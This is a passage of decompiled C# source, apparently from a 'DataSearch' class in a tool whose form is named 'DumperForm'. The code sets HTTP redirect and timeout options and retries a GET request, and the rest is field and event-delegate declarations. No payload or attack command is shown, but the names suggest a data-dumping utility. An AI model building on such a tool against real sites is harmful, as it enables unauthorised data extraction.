			this.analyzer_0.HTTPExt_0.FollowRedirects = Conversions.ToBoolean(global::Globals.GetObjectValue(global::Globals.GMain.DumperForm.chkHttpRedirect));
			this.analyzer_0.HTTPExt_0.TimeOut = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.DumperForm.numTimeOut));
		}
		else
		{
			this.analyzer_0.HTTPExt_0.TimeOut = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numHTTPTimeout));
		}
		int num = this.int_0;
		int i = 0;
		checked
		{
			while (i <= num)
			{
				this.method_7();
				string result;
				if (!this.method_6())
				{
					string text = this.analyzer_0.HTTPExt_0.QuickGet(string_1);
					this.stopwatch_0 = Stopwatch.StartNew();
					if (string.IsNullOrEmpty(text))
					{
						if (this.analyzer_0.HTTPExt_0.Status() <= 0)
						{
							if (i >= this.int_0)
							{
								this.RetyFailed = true;
							}
							i++;
							continue;
						}
						IL_122:
						result = string.Empty;
					}
					else
					{
						result = text;
					}
				}
				else
				{
					result = Conversions.ToString(false);
				}
				return result;
			}
			goto IL_122;
		}
	}

	// Token: 0x040008AE RID: 2222
	private Stopwatch stopwatch_0;

	// Token: 0x040008AF RID: 2223
	private string string_0;

	// Token: 0x040008B0 RID: 2224
	private Analyzer analyzer_0;

	// Token: 0x040008B1 RID: 2225
	private bool bool_0;

	// Token: 0x040008B2 RID: 2226
	private int int_0;

	// Token: 0x040008B3 RID: 2227
	private int int_1;

	// Token: 0x040008B4 RID: 2228
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_1;

	// Token: 0x040008B5 RID: 2229
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_2;

	// Token: 0x040008B6 RID: 2230
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private List<string> list_0;

	// Token: 0x040008B7 RID: 2231
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_2;

	// Token: 0x040008B8 RID: 2232
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DataSearch.OnDataChangedEventHandler onDataChangedEventHandler_0;

	// Token: 0x040008B9 RID: 2233
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DataSearch.OnCompleteEventHandler onCompleteEventHandler_0;

	// Token: 0x040008BA RID: 2234
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataSearch.OnProgressEventHandler onProgressEventHandler_0;

	// Token: 0x040008BB RID: 2235
	private int $STATIC$DumpToFile$2021E151280A11E$MaxBlacks;

	// Token: 0x040008BC RID: 2236
	private StaticLocalInitFlag $STATIC$DumpToFile$2021E151280A11E$MaxBlacks$Init;

	// Token: 0x02000105 RID: 261
	// (Invoke) Token: 0x06001149 RID: 4425
	public delegate void OnDataChangedEventHandler(string data);

	// Token: 0x02000106 RID: 262
	// (Invoke) Token: 0x0600114D RID: 4429
	public delegate void OnCompleteEventHandler();

	// Token: 0x02000107 RID: 263
	// (Invoke) Token: 0x06001151 RID: 4433
	public delegate void OnProgressEventHandler(int perc, string desc);
}
